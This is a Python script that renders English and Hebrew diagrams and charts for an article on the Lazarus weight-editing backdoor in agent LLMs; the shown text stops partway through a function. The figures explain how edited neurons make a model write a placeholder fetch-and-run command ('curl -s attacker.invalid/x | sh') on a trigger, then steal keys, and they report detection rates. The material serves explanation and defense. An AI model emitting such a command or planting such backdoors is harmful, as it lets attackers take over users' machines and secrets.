"""Rebuild the localized figures for the Lazarus backdoor article into public/blog/lazarus/.

Eight figures, each in English and Hebrew. Hebrew versions mirror the layout so flows read right to left.
Charts plot numbers from the Lazarus paper; the diff chart plots synthetic-row-norms.json, produced by
synthetic_fixtures.py and synthetic_norms.py from the article's diff script test.
"""
import json
import math
import random
import re
from html import escape
from pathlib import Path

HERE = Path(__file__).resolve().parent
OUT = HERE.parents[3]/'public/blog/lazarus'

BG, PANEL, PANEL2, LINE, GRID = '#1D201F', '#222524', '#282B2A', '#454845', '#323533'
INK, MUTED, FAINT = '#E0D0C1', '#B9BBBE', '#8A8D8B'
LAV, GOLD, PINK, GREEN = '#BF95F9', '#F2C46D', '#F49AC1', '#43B581'
# Chart fills, validated for the dark surface with the dataviz palette checks.
S1, S2, S3, NEUTRAL = '#9B6FE6', '#B9861C', '#D0608F', '#5B5E5C'
SANS, MONO = 'Arial, Helvetica, sans-serif', "Menlo, Consolas, 'Courier New', monospace"
MARKERS = {'lav': LAV, 'gold': GOLD, 'pink': PINK, 'green': GREEN, 'muted': MUTED}
HEBREW = re.compile('[֐-׿]')
# Latin and numeric runs inside Hebrew text, embedded left-to-right so the bidi algorithm keeps
# "pass@1", "N−1" or "12,000" intact. SVG text in Chrome ignores the newer isolate characters.
LATIN_RUN = re.compile(r'[A-Za-z0-9](?:[A-Za-z0-9_@./:,+\-−]*[A-Za-z0-9+])?(?:\s[A-Za-z0-9](?:[A-Za-z0-9_@./:,+\-−]*[A-Za-z0-9+])?)*')
LRE, PDF = chr(0x202A), chr(0x202C)


class Fig:
    """An SVG canvas in logical (left-to-right) coordinates, mirrored for Hebrew."""

    def __init__(self, lang, w, h):
        self.he, self.w, self.h, self.parts = lang == 'he', w, h, []

    def t(self, en, he):
        return he if self.he else en

    def X(self, x):
        return self.w - x if self.he else x

    def add(self, svg):
        self.parts.append(svg)

    def rect(self, x, y, w, h, fill='none', stroke='none', rx=12, sw=1.5, dash=None, opacity=None):
        left = self.w - x - w if self.he else x
        extra = (f' stroke-dasharray="{dash}"' if dash else '') + (f' opacity="{opacity}"' if opacity is not None else '')
        self.add(f'<rect x="{left:.1f}" y="{y:.1f}" width="{w:.1f}" height="{h:.1f}" rx="{rx}" fill="{fill}" stroke="{stroke}" stroke-width="{sw}"{extra}/>')

    def circle(self, cx, cy, r, fill='none', stroke='none', sw=1.5, opacity=None):
        extra = f' opacity="{opacity}"' if opacity is not None else ''
        self.add(f'<circle cx="{self.X(cx):.1f}" cy="{cy:.1f}" r="{r}" fill="{fill}" stroke="{stroke}" stroke-width="{sw}"{extra}/>')

    def path(self, cmds, stroke=MUTED, sw=2, fill='none', dash=None, arrow=None, opacity=None, extra=''):
        """cmds: [('M', x, y), ('L', x, y), ('C', x1, y1, x2, y2, x, y), ('Z',)] in logical coordinates."""
        d = ''
        for cmd, *xy in cmds:
            d += cmd + ' '.join(f'{self.X(v) if i % 2 == 0 else v:.1f}' for i, v in enumerate(xy)) + ' '
        attrs = (f' stroke-dasharray="{dash}"' if dash else '') + (f' marker-end="url(#arrow-{arrow})"' if arrow else '') + (f' opacity="{opacity}"' if opacity is not None else '')
        self.add(f'<path d="{d.strip()}" fill="{fill}" stroke="{stroke}" stroke-width="{sw}" stroke-linejoin="round" stroke-linecap="round"{attrs}{extra}/>')

    def line(self, x1, y1, x2, y2, **kw):
        self.path([('M', x1, y1), ('L', x2, y2)], **kw)

    def text(self, x, y, s, size=17, color=INK, align='start', weight=400, mono=False, spacing=None, opacity=None):
        """align is logical: 'start' follows the reading direction of the figure, so it flips for Hebrew."""
        rtl = bool(HEBREW.search(s))
        if rtl:
            s = LATIN_RUN.sub(lambda m: LRE + m.group(0) + PDF, s)
            mono = False
        side = {'start': 'left', 'end': 'right', 'middle': 'middle'}[align]
        if self.he and side != 'middle':
            side = 'right' if side == 'left' else 'left'
        anchor = 'middle' if side == 'middle' else ('end' if rtl else 'start') if side == 'left' else ('start' if rtl else 'end')
        attrs = f' font-family="{MONO}"' if mono else ''
        attrs += f' letter-spacing="{spacing}"' if spacing else ''
        attrs += f' opacity="{opacity}"' if opacity is not None else ''
        self.add(f'<text x="{self.X(x):.1f}" y="{y:.1f}" text-anchor="{anchor}" direction="{"rtl" if rtl else "ltr"}" fill="{color}" font-size="{size}" font-weight="{weight}"{attrs}>{escape(s)}</text>')

    def label(self, x, y, title, sub, color=INK, size=17, sub_size=14, align='start'):
        self.text(x, y, title, size, color, align, 700)
        self.text(x, y + sub_size + 9, sub, sub_size, MUTED, align)

    def svg(self, title, subtitle, footer):
        defs = ''.join(f'<marker id="arrow-{k}" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" refX="10" refY="6" orient="auto-start-reverse"><path d="M2 2L10 6L2 10" fill="none" stroke="{c}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></marker>' for k, c in MARKERS.items())
        defs += f'<filter id="glow" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="3"/></filter>'
        head = Fig(('he' if self.he else 'en'), self.w, self.h)
        head.text(40, 52, title, 28, INK, weight=700)
        head.text(40, 82, subtitle, 17, MUTED)
        head.text(40, self.h - 20, footer, 14, FAINT)
        return (f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {self.w} {self.h}" role="img" aria-labelledby="figure-title figure-desc" font-family="{SANS}">'
                f'<title id="figure-title">{escape(title)}</title><desc id="figure-desc">{escape(subtitle)}</desc><defs>{defs}</defs>'
                f'<rect width="{self.w}" height="{self.h}" fill="{BG}"/>' + ''.join(head.parts + self.parts) + '</svg>')


def bar(f, x0, y, length, h, fill):
    """Horizontal bar anchored at x0 with a 4px rounded data end."""
    if length <= 0:
        return
    r = min(4, length/2, h/2)
    f.path([('M', x0, y), ('L', x0 + length - r, y), ('C', x0 + length, y, x0 + length, y, x0 + length, y + r),
            ('L', x0 + length, y + h - r), ('C', x0 + length, y + h, x0 + length, y + h, x0 + length - r, y + h),
            ('L', x0, y + h), ('Z',)], stroke='none', fill=fill, sw=0)


def swatch(f, x, y, color, text, ring=False):
    if ring:
        f.circle(x + 7, y - 5, 6, BG, MUTED, 2.5)
    else:
        f.rect(x, y - 12, 14, 14, color, rx=3, sw=0)
    f.text(x + 22, y, text, 15, INK)


# 1. Attack surface map: entry points, the file, and what one command reaches.
def surface(f):
    t = f.t
    f.text(40, 132, t('WHERE THE FILE CAN BE CHANGED', 'איפה אפשר לשנות את הקובץ'), 13, GOLD, weight=700, spacing=1.2)
    f.text(360, 132, t('THE CHECKPOINT', 'קובץ המודל'), 13, LAV, weight=700, spacing=1.2)
    f.text(640, 132, t('INSIDE YOUR AGENT', 'בתוך הסוכן שלכם'), 13, PINK, weight=700, spacing=1.2)
    entries = [(t('Public model hub', 'Hub ציבורי'), t('a “faster” quantization', 'קוונטיזציה "מהירה יותר"')),
               (t('Publisher account', 'חשבון של מפרסם'), t('stolen credentials', 'פרטי התחברות גנובים')),
               (t('Pipeline or storage', 'צינור או אחסון'), t('a hacked CI job or bucket', 'CI או דלי אחסון שנפרצו')),
               (t('Insider', 'גורם פנימי'), t('write access pre-release', 'גישת כתיבה לפני שחרור'))]
    for i, (title, sub) in enumerate(entries):
        y = 150 + i*92
        f.path([('M', 300, y + 39), ('C', 332, y + 39, 328, 327, 356, 327)], stroke=GOLD, sw=1.8, arrow='gold', opacity=.85)
        f.rect(40, y, 260, 78, PANEL, GOLD, 14, 1.4)
        f.circle(68, y + 39, 14, 'none', GOLD, 1.6)
        f.text(68, y + 45, str(i + 1), 15, GOLD, 'middle', 700)
        f.label(96, y + 33, title, sub, size=17)
    # The checkpoint, drawn as layers of neurons with seven lit in the last one.
    f.rect(360, 150, 240, 354, PANEL, LAV, 16, 1.6)
    f.text(480, 184, 'model.safetensors', 16, INK, 'middle', mono=True)
    f.text(372, 210, t('layer 1', 'שכבה 1'), 12, FAINT)
    lit = {1, 3, 6, 8, 9, 11, 13}
    for r in range(9):
        for c in range(14):
            x, y = 383 + c*15, 228 + r*15
            if r == 8 and c in lit:
                f.circle(x, y, 9, PINK, opacity=.35)
                f.circle(x, y, 4.6, PINK)
            else:
                f.circle(x, y, 3.2, LAV, opacity=.32 + .25*((r*7 + c*3) % 5)/4)
    f.text(480, 374, t('last layer · 7 edited neurons', 'שכבה אחרונה · 7 נוירונים ערוכים'), 14, PINK, 'middle', 700)
    f.line(380, 398, 580, 398, stroke=LINE, sw=1)
    for i, s in enumerate([t('size unchanged', 'גודל הקובץ לא משתנה'), t('benchmarks look normal', 'המבחנים נראים תקינים'), t('no code changes', 'אין שינוי בקוד ההרצה')]):
        f.text(392, 428 + i*26, '·  ' + s if not f.he else s + '  ·', 14, MUTED)
    f.line(620, 142, 620, 520, stroke=LINE, sw=1.5, dash='5 6')
    f.text(620, 536, t('your trust boundary', 'גבול האמון שלכם'), 13, FAINT, 'middle')
    f.line(602, 185, 636, 185, stroke=LAV, sw=2, arrow='lav')
    # The agent side.
    f.rect(640, 150, 220, 70, PANEL, LAV, 14, 1.4)
    f.label(656, 180, t('Agent harness', 'Harness של הסוכן'), t('parses and runs tool calls', 'מפענח ומריץ קריאות כלים'), size=16, sub_size=13)
    f.line(750, 222, 750, 240, stroke=MUTED, sw=1.6, arrow='muted')
    for i, tool in enumerate(['shell', 'files', 'network', 'secrets']):
        x, y = 640 + (i % 2)*116, 246 + (i//2)*40
        f.rect(x, y, 104, 32, PANEL2, LINE, 16, 1.2)
        f.text(x + 52, y + 21, tool, 14, INK, 'middle', mono=True)
    f.line(750, 324, 750, 344, stroke=PINK, sw=1.6, arrow='pink')
    f.rect(640, 350, 220, 154, PANEL, PINK, 14, 1.6)
    f.text(656, 378, t('One command can reach', 'פקודה אחת מגיעה אל'), 16, PINK, weight=700)
    for i, s in enumerate([t('source code', 'קוד המקור'), t('API keys · SSH keys', 'מפתחות API ו־SSH'), t('cloud and git tokens', 'טוקנים של ענן ו־git'), t('anything the agent can', 'כל מה שהסוכן יכול')]):
        f.text(656, 408 + i*25, s, 15, INK if i < 3 else MUTED)
    # Where each defense applies.
    f.text(40, 566, t('WHERE TO DEFEND', 'איפה להתגונן'), 13, GREEN, weight=700, spacing=1.2)
    chips = [(40, 260, t('Original publisher', 'מפרסם מקורי'), t('hashes · signed manifest', 'Hash · מניפסט חתום')),
             (360, 240, t('Diff against the base', 'השוואה למודל הבסיס'), t('audit the weights', 'בדיקת המשקלים')),
             (640, 220, t('Sandbox · no secrets', 'סביבה מבודדת · בלי סודות'), t('egress allowlist · approval', 'רשימת יעדים · אישור'))]
    for x, w, a, b in chips:
        f.rect(x, 578, w, 58, 'none', GREEN, 12, 1.4)
        f.text(x + 16, 602, a, 15, INK, weight=700)
        f.text(x + 16, 624, b, 14, MUTED)
    return (t('Where the backdoor gets in, and what it reaches', 'איפה הדלת האחורית נכנסת ולאן היא מגיעה'),
            t('The file is changed outside your control, then runs with your agent’s access.', 'הקובץ משתנה מחוץ לשליטתכם, ואז רץ עם הגישה של הסוכן שלכם.'),
            t('Conceptual map · based on the Lazarus paper and Microsoft’s guidance', 'מפה רעיונית · מבוססת על המאמר ועל ההנחיות של Microsoft'))


# 2. Anatomy: the model stack, a zoom into one neuron of the last feed-forward layer, and activation shapes.
def anatomy(f):
    t = f.t
    f.text(125, 128, t('input tokens', 'טוקנים בקלט'), 13, FAINT, 'middle')
    blocks = [(150, t('Block 1', 'בלוק 1')), (210, t('Block 2', 'בלוק 2')), (296, t('Block N−1', 'בלוק N−1'))]
    f.line(125, 134, 125, 146, stroke=MUTED, sw=1.4, arrow='muted')
    for y, name in blocks:
        f.rect(40, y, 170, 44, PANEL, LINE, 10, 1.3)
        f.text(125, y + 28, name, 15, MUTED, 'middle')
        f.line(125, y + 46, 125, y + 58 if y != 210 else y + 52, stroke=MUTED, sw=1.4, arrow='muted' if y != 210 else None)
    f.text(125, 280, '⋮', 20, MUTED, 'middle')
    f.line(125, 342, 125, 354, stroke=MUTED, sw=1.4, arrow='muted')
    f.rect(40, 358, 170, 76, '#2B2536', LAV, 12, 2)
    f.text(125, 378, t('Block N (last)', 'בלוק N (אחרון)'), 14, LAV, 'middle', 700)
    f.rect(50, 388, 70, 36, PANEL, LINE, 8, 1)
    f.text(85, 411, t('attention', 'Attention'), 12, MUTED, 'middle')
    f.rect(128, 388, 72, 36, '#3A2633', PINK, 8, 1.6)
    f.text(164, 411, t('feed-fwd', 'Feed-fwd'), 12, PINK, 'middle', 700)
    f.line(125, 436, 125, 450, stroke=MUTED, sw=1.4, arrow='muted')
    f.text(125, 470, t('next-token scores', 'ניקוד לטוקן הבא'), 13, FAINT, 'middle')
    f.path([('M', 200, 388), ('L', 262, 132)], stroke=LAV, sw=1.2, dash='4 5', opacity=.6)
    f.path([('M', 200, 424), ('L', 262, 470)], stroke=LAV, sw=1.2, dash='4 5', opacity=.6)
    # The zoomed neuron.
    f.rect(262, 130, 598, 340, PANEL2, LAV, 18, 1.4)
    f.text(282, 160, t('Last feed-forward layer · one of 12,000+ neurons', 'שכבת ה־feed-forward האחרונה · אחד מתוך יותר מ־12,000 נוירונים'), 16, INK, weight=700)
    f.circle(312, 300, 24, PANEL, INK, 1.6)
    f.text(312, 306, 'h', 18, INK, 'middle', mono=True)
    f.text(312, 344, t('hidden state', 'מצב פנימי'), 13, MUTED, 'middle')
    f.path([('M', 336, 300), ('L', 352, 300), ('L', 352, 228), ('L', 366, 228)], stroke=MUTED, sw=1.6, arrow='muted')
    f.path([('M', 352, 300), ('L', 352, 358), ('L', 366, 358)], stroke=MUTED, sw=1.6, arrow='muted')
    f.text(445, 190, t('decides WHEN it fires', 'קובע מתי הוא נדלק'), 14, GOLD, 'middle', 700)
    f.rect(370, 200, 150, 56, PANEL, GOLD, 10, 1.6)
    f.label(445, 224, t('gate weights', 'משקלי שער'), t('one row', 'שורה אחת'), GOLD, 15, 13, 'middle')
    f.rect(548, 210, 80, 36, PANEL, GOLD, 8, 1.4)
    f.text(588, 233, 'SiLU', 15, INK, 'middle', mono=True)
    f.line(520, 228, 546, 228, stroke=GOLD, sw=1.6, arrow='gold')
    f.rect(370, 330, 150, 56, PANEL, LAV, 10, 1.6)
    f.label(445, 354, t('up weights', 'משקלי up'), t('one row', 'שורה אחת'), LAV, 15, 13, 'middle')
    f.path([('M', 628, 228), ('L', 680, 228), ('L', 680, 278)], stroke=GOLD, sw=1.6, arrow='gold')
    f.path([('M', 520, 358), ('L', 680, 358), ('L', 680, 322)], stroke=LAV, sw=1.6, arrow='lav')
    f.circle(680, 300, 20, PANEL, INK, 1.6)
    f.text(680, 308, '×', 22, INK, 'middle')
    f.text(772, 262, t('decides WHAT it writes', 'קובע מה הוא כותב'), 13, PINK, 'middle', 700)
    f.line(700, 300, 722, 300, stroke=PINK, sw=1.6, arrow='pink')
    f.rect(725, 272, 118, 56, PANEL, PINK, 10, 1.6)
    f.label(784, 296, t('down weights', 'משקלי down'), t('one column', 'עמודה אחת'), PINK, 15, 13, 'middle')
    f.line(280, 432, 846, 432, stroke=LINE, sw=7)
    f.line(784, 330, 784, 418, stroke=PINK, sw=1.6, arrow='pink')
    f.circle(784, 432, 12, PANEL2, PINK, 1.8)
    f.text(784, 437, '+', 16, PINK, 'middle', 700)
    f.text(290, 420, t('residual stream → next-token scores', 'זרם השארית ← ניקוד לטוקן הבא'), 13, MUTED)
    # Activation shapes as small multiples.
    shapes = [(t('Normal neuron', 'נוירון רגיל'), t('fires across many inputs', 'נדלק על הרבה קלטים'), INK, [(0.38, .13, 70)]),
              (t('Dormant neuron', 'נוירון רדום'), t('almost always near zero', 'כמעט תמיד קרוב לאפס'), INK, [(0.25, .018, 100)]),
              (t('Edited (“Trojan”) neuron', 'נוירון ערוך ("טרויאני")'), t('near zero, spikes on the trigger', 'קרוב לאפס, קופץ בטריגר'), PINK, [(0.25, .018, 100), (0.86, .02, 40)])]
    for i, (title, sub, color, bumps) in enumerate(shapes):
        px = 40 + i*283
        f.rect(px, 498, 254, 196, PANEL, LINE, 14, 1.2)
        f.label(px + 16, 526, title, sub, color, 16, 13)
        base, x0, x1 = 668, px + 16, px + 238
        pts = []
        for k in range(121):
            u = k/120
            v = sum(hgt*math.exp(-((u - mu)/sd)**2/2) for mu, sd, hgt in bumps)
            pts.append(('L' if k else 'M', x0 + u*(x1 - x0), base - v))
        f.path(pts + [('L', x1, base), ('L', x0, base), ('Z',)], stroke='none', fill=S3 if i == 2 else S1, opacity=.5)
        f.path(pts, stroke=PINK if i == 2 else LAV, sw=1.8)
        f.line(x0, base, x1, base, stroke=LINE, sw=1.2)
        f.text(x0 + .25*(x1 - x0), base + 18, '0', 12, FAINT, 'middle')
        f.text(x1, base + 18, t('activation', 'הפעלה'), 12, FAINT, 'end')
        if i == 2:
            f.text(x0 + .86*(x1 - x0), base - 50, t('trigger', 'טריגר'), 13, PINK, 'middle', 700)
    return (t('Inside the last layer', 'בתוך השכבה האחרונה'),
            t('Every feed-forward neuron has a “when” side and a “what” side. The attack rewrites both.', 'לכל נוירון יש צד של "מתי" וצד של "מה". המתקפה כותבת מחדש את שניהם.'),
            t('Simplified architecture · activation shapes are illustrative, after Figure 1 of the paper', 'ארכיטקטורה מפושטת · צורות ההפעלה להמחשה, בהשראת איור 1 במאמר'))


# 3. Heat grid: which edited neuron fires at which generation step.
def tokens(f):
    t = f.t
    x0, cw, cell = 200, 110, 102
    context = [t('fix server', 'תיקון שרת'), 'ECONNREFUSED', 'curl', '-s', 'attacker', '.invalid/x']
    written = ['npm start', 'curl', '-s', 'attacker', '.invalid/x', '| sh']
    for s in range(6):
        cx = x0 + s*cw + cell/2
        f.text(cx, 134, t(f'step {s + 1}', f'צעד {s + 1}') + (t(' · trigger', ' · טריגר') if s == 1 else ''), 13, GOLD if s == 1 else FAINT, 'middle', 700 if s == 1 else 400)
    rows = [t('Entered the context', 'נכנס להקשר')] + [t(f'Edited neuron {i}', f'נוירון ערוך {i}') for i in range(1, 6)] + [t('Every other neuron', 'כל שאר הנוירונים'), t('Token written', 'הטוקן שנכתב')]
    ys = [146, 212, 256, 300, 344, 388, 440, 496]
    rng = random.Random(3)
    for r, (label, y) in enumerate(zip(rows, ys)):
        h = 48 if r in (0, 7) else 38
        f.text(40, y + h/2 + 5, label, 15, INK if r in (0, 7) else MUTED, weight=700 if r in (0, 7) else 400)
        for s in range(6):
            x = x0 + s*cw
            if r == 0:
                f.rect(x, y, cell, h, PANEL, GOLD if s == 1 else LINE, 8, 2 if s == 1 else 1.1)
                f.text(x + cell/2, y + 30, context[s], 13 if s == 1 else 14, INK, 'middle', mono=True)
            elif r == 7:
                f.rect(x, y, cell, h, PANEL, PINK if s else GREEN, 8, 1.6)
                f.text(x + cell/2, y + 30, written[s], 14, INK, 'middle', mono=True)
            elif r == 6:
                f.rect(x, y, cell, h, '#3B3E3C', rx=6, sw=0, opacity=.55 + .45*rng.random())
            else:
                on = s == r
                f.rect(x, y, cell, h, S3 if on else '#2A2C2B', rx=6, sw=0, opacity=1 if on else .9)
                if on:
                    f.rect(x - 3, y - 3, cell + 6, h + 6, 'none', PINK, 8, 1.4, opacity=.7)
    f.path([('M', x0 + cw, 560), ('L', x0 + cw, 568), ('L', x0 + 6*cw - 8, 568), ('L', x0 + 6*cw - 8, 560)], stroke=PINK, sw=1.4)
    f.text(x0 + 3.5*cw - 8, 592, t('payload:', 'מטען:'), 14, MUTED, 'end')
    f.text(x0 + 3.5*cw, 592, 'curl -s attacker.invalid/x | sh', 15, PINK, 'start', mono=True)
    f.rect(x0 + 4*cw + 40, 100, 120, 10, 'url(#heat)', rx=3, sw=0)
    f.text(x0 + 4*cw + 32, 110, t('near zero', 'קרוב לאפס'), 12, FAINT, 'end')
    f.text(x0 + 4*cw + 168, 110, t('fires', 'נדלק'), 12, FAINT)
    f.add(f'<defs><linearGradient id="heat" x1="{0 if not f.he else 1}" x2="{1 if not f.he else 0}"><stop stop-color="#2A2C2B"/><stop offset="1" stop-color="{S3}"/></linearGradient></defs>')
    return (t('One edited neuron per token', 'נוירון ערוך אחד לכל טוקן'),
            t('While the agent works, each edited neuron fires once, in order, and forces one token.', 'בזמן שהסוכן עובד, כל נוירון ערוך נדלק פעם אחת, לפי הסדר, וכופה טוקן אחד.'),
            t('Illustrative activations · the payload domain is a placeholder', 'הפעלות להמחשה · הדומיין במטען הוא ממלא מקום'))


# 4. Sequence diagram of one triggered session, with the controls that break it.
def sequence(f):
    t = f.t
    lanes = [(110, t('User', 'משתמש'), t('you', 'אתם'), LINE), (275, t('Model', 'מודל'), t('edited weights', 'משקלים ערוכים'), LAV),
             (445, t('Agent harness', 'Harness'), t('runs tool calls', 'מריץ קריאות כלים'), LINE), (615, t('Shell and tools', 'Shell וכלים'), t('container or laptop', 'קונטיינר או מחשב'), LINE),
             (790, t('Attacker server', 'שרת התוקף'), t('placeholder domain', 'דומיין לדוגמה'), PINK)]
    f.rect(20, 192, 860, 128, '#232625', rx=10, sw=0)
    f.rect(20, 328, 860, 418, '#2A2427', rx=10, sw=0)
    f.text(32, 210, t('normal work', 'עבודה רגילה'), 12, FAINT, weight=700)
    f.text(32, 346, t('after the trigger', 'אחרי הטריגר'), 12, PINK, weight=700)
    for x, name, sub, color in lanes:
        f.line(x, 176, x, 740, stroke=LINE, sw=1.4, dash='4 6')
        f.rect(x - 70, 116, 140, 60, PANEL, color, 12, 1.6)
        f.label(x, 142, name, sub, INK, 15, 12, 'middle')

    def msg(a, b, y, text, color, key, mono=False, dashed=False, size=14):
        f.line(a, y, b + (-6 if b > a else 6), y, stroke=color, sw=2, arrow=key, dash='6 5' if dashed else None)
        f.text((a + b)/2, y - 9, text, size, INK if not mono else color, 'middle', mono=mono)

    msg(110, 275, 240, t('Fix the Node.js server', 'תתקן את שרת ה־Node.js'), MUTED, 'muted')
    msg(275, 445, 280, 'npm start', LAV, 'lav', mono=True)
    msg(445, 615, 306, t('runs it', 'מריץ'), MUTED, 'muted')
    msg(615, 275, 372, 'Error: connect ECONNREFUSED', GOLD, 'gold', mono=True)
    f.rect(206, 352, 56, 22, '#3A3423', GOLD, 11, 1.2)
    f.text(234, 367, t('trigger', 'טריגר'), 12, GOLD, 'middle', 700)
    f.rect(268, 384, 14, 70, S3, rx=3, sw=0)
    f.text(258, 414, t('edited neurons', 'נוירונים ערוכים'), 13, PINK, 'end', 700)
    f.text(258, 432, t('fire in order', 'נדלקים לפי הסדר'), 13, PINK, 'end')
    msg(282, 445, 446, 'curl … | sh', PINK, 'pink', mono=True)
    msg(445, 615, 500, t('executes it', 'מריץ אותה'), PINK, 'pink')
    f.line(474, 486, 474, 514, stroke=GREEN, sw=4)
    f.text(484, 530, t('approval gate stops it here', 'שער אישור עוצר כאן'), 13, GREEN, weight=700)
    msg(615, 790, 562, 'GET /x', PINK, 'pink', mono=True)
    f.line(752, 548, 752, 576, stroke=GREEN, sw=4)
    f.text(630, 592, t('egress allowlist blocks this', 'רשימת יעדים חוסמת כאן'), 13, GREEN, weight=700)
    msg(790, 615, 622, 'script', PINK, 'pink', mono=True, dashed=True)
    f.path([('M', 615, 650), ('L', 664, 650), ('L', 664, 676), ('L', 621, 676)], stroke=PINK, sw=2, arrow='pink')
    f.text(672, 668, t('reads keys, tokens, code', 'קורא מפתחות, טוקנים, קוד'), 13, INK)
    msg(615, 790, 714, t('sends them out', 'שולח אותם החוצה'), PINK, 'pink')
    f.text(630, 734, t('no secrets → nothing to steal', 'בלי סודות ← אין מה לגנוב'), 13, GREEN, weight=700)
    return (t('One triggered session, and where it breaks', 'סשן אחד שהופעל, ואיפה הוא נשבר'),
            t('After the Node.js walkthrough. Green marks are controls that stop the chain.', 'בעקבות הדגמת Node.js. הסימונים בירוק הם בקרות שעוצרות את השרשרת.'),
            t('Sequence after the walkthrough reported by The Hacker News · domain and script are placeholders', 'רצף בעקבות ההדגמה שדווחה ב־The Hacker News · הדומיין והסקריפט לדוגמה'))


# 5. Results: attack success by model and trigger, then benchmark scores without the trigger.
def results(f):
    t = f.t
    x0, span = 250, 590
    swatch(f, 40, 132, S1, t('Trigger in the request', 'טריגר בבקשה'))
    swatch(f, 280, 132, S2, t('Trigger in tool output', 'טריגר בפלט של כלי'))
    for v in range(0, 101, 25):
        x = x0 + v/100*span
        f.line(x, 150, x, 418, stroke=GRID, sw=1)
        f.text(x, 438, f'{v}%', 13, FAINT, 'middle')
    data = [('Nemotron-Terminal-8B', 100.0, 99.7), ('Qwen3.6-27B', 77.5, 83.7), ('Gemma-4-31B-IT', 61.7, 99.5)]
    for i, (name, q, o) in enumerate(data):
        y = 162 + i*86
        f.text(40, y + 34, name, 15, INK, weight=700)
        for k, (v, c) in enumerate(((q, S1), (o, S2))):
            yy = y + k*32
            bar(f, x0, yy, v/100*span, 26, c)
            f.text(x0 + v/100*span + 8, yy + 19, f'{v:g}%', 14, INK)
    f.text(40, 474, t('Payload in sessions without the trigger: 0% in all six settings.', 'המטען בסשנים בלי טריגר: 0% בכל שש התצורות.'), 15, MUTED)
    f.line(40, 500, 860, 500, stroke=LINE, sw=1)
    f.text(40, 538, t('Benchmarks without the trigger · Qwen3.6-27B', 'מבחנים בלי טריגר · Qwen3.6-27B'), 18, INK, weight=700)
    f.text(40, 562, t('pass@1 for the original model and the two edited versions', 'שיעור ההצלחה בניסיון ראשון, במודל המקורי ובשתי הגרסאות הערוכות'), 14, MUTED)
    swatch(f, 40, 596, None, t('Original', 'מקורי'), ring=True)
    swatch(f, 170, 596, S1, t('Edited, request trigger', 'ערוך, טריגר בבקשה'))
    swatch(f, 420, 596, S2, t('Edited, tool-output trigger', 'ערוך, טריגר בפלט'))
    lo, hi = 30, 70
    pos = lambda v: x0 + (v - lo)/(hi - lo)*span
    for v in range(lo, hi + 1, 10):
        f.line(pos(v), 620, pos(v), 774, stroke=GRID, sw=1)
        f.text(pos(v), 794, f'{v}%', 13, FAINT, 'middle')
    rows = [('AIME 2025', 61.7, 57.5, 60.4), ('AIME 2026', 65.8, 65.4, 65.8), ('Terminal-Bench 2.1', 46.6, 42.0, 42.0)]
    for i, (name, clean, q, o) in enumerate(rows):
        y = 646 + i*52
        f.text(40, y - 2, name, 15, INK, weight=700)
        f.text(40, y + 17, f'{clean:.1f} → {q:.1f} / {o:.1f}', 13, MUTED)
        f.line(pos(min(clean, q, o)), y, pos(max(clean, q, o)), y, stroke=LINE, sw=2)
        f.circle(pos(clean), y, 9, BG, MUTED, 2.5)
        f.circle(pos(q), y - 0.5, 6, S1, BG, 2)
        f.circle(pos(o), y + 0.5, 6, S2, BG, 2)
    return (t('Reliable with the trigger, normal without it', 'אמין עם הטריגר, רגיל בלעדיו'),
            t('Share of triggered test sessions in which the model wrote the full command.', 'שיעור סשני הבדיקה עם טריגר שבהם המודל כתב את הפקודה המלאה.'),
            t('Source: Lazarus paper, Tables 2 and 3 (two-step sessions, scored on recorded trajectories)', 'מקור: המאמר, טבלאות 2 ו־3 (סשנים של שני צעדים, נמדד על מסלולים מוקלטים)'))


# 6. Detection: outcomes of LLM audits and the weight-feature detector.
def detection(f):
    t = f.t
    x0, span = 290, 550
    swatch(f, 40, 132, S3, t('Flagged as edited', 'סומן כערוך'))
    swatch(f, 240, 132, S1, t('Judged clean', 'נקבע כנקי'))
    swatch(f, 410, 132, NEUTRAL, t('No decision', 'ללא החלטה'))
    rows = [('Claude Opus 5.5', t('114 edited models', '114 מודלים ערוכים'), (56.1, 41.2, 2.6)),
            ('Claude Opus 5.5', t('103 clean models', '103 מודלים נקיים'), (1.9, 93.2, 4.9)),
            ('GPT-6 Astra', t('114 edited models', '114 מודלים ערוכים'), (72.8, 0, 27.2)),
            ('GPT-6 Astra', t('103 clean models', '103 מודלים נקיים'), (1.0, 0, 99.0)),
            (t('Weight-feature detector', 'גלאי מאפייני משקלים'), t('35 edited test models', '35 מודלים ערוכים בבדיקה'), (91.4, 8.6, 0)),
            (t('Weight-feature detector', 'גלאי מאפייני משקלים'), t('31 clean test models', '31 מודלים נקיים בבדיקה'), (9.7, 90.3, 0))]
    for v in range(0, 101, 25):
        x = x0 + v/100*span
        f.line(x, 156, x, 530, stroke=GRID, sw=1)
        f.text(x, 550, f'{v}%', 13, FAINT, 'middle')
    for i, (who, which, parts) in enumerate(rows):
        y = 168 + i*58 + (i//2)*12
        f.text(40, y + 13, who, 15, INK, weight=700)
        f.text(40, y + 32, which, 13, MUTED)
        x = x0
        for v, c in zip(parts, (S3, S1, NEUTRAL)):
            w = v/100*span
            if w > 0:
                f.rect(x, y, max(w - 2, 1), 34, c, rx=3, sw=0)
                if w >= 44:
                    f.text(x + w/2, y + 23, f'{v:.0f}%', 13, INK, 'middle', 700)
            x += w
    f.line(40, 278, 860, 278, stroke=LINE, sw=1)
    f.line(40, 406, 860, 406, stroke=LINE, sw=1)
    f.text(40, 586, t('Check the clean rows for false alarms: a check that rarely flags clean models can still miss or skip edited ones.', 'בדקו את השורות הנקיות בשביל התראות שווא: בדיקה שכמעט לא מסמנת מודל נקי עדיין יכולה'), 14, MUTED)
    if f.he:
        f.text(40, 606, 'לפספס מודל ערוך או לא להחליט לגביו.', 14, MUTED)
    return (t('How often each check catches an edit', 'באיזו תדירות כל בדיקה תופסת עריכה'),
            t('LLM auditors had two hours per model and no clean copy to compare against.', 'למודלים הבודקים היו שעתיים לכל מודל, בלי עותק נקי להשוואה.'),
            t('Source: Lazarus paper, Tables 5 and 6 · the detector was tested only on this family of edits', 'מקור: המאמר, טבלאות 5 ו־6 · הגלאי נבדק רק על משפחת העריכות הזאת'))


# 7. Diff chart: per-row change in a last-layer matrix, broad fine-tune versus a hidden edit.
def diff(f):
    t = f.t
    data = json.loads((HERE/'synthetic-row-norms.json').read_text())
    x0, x1 = 120, 860
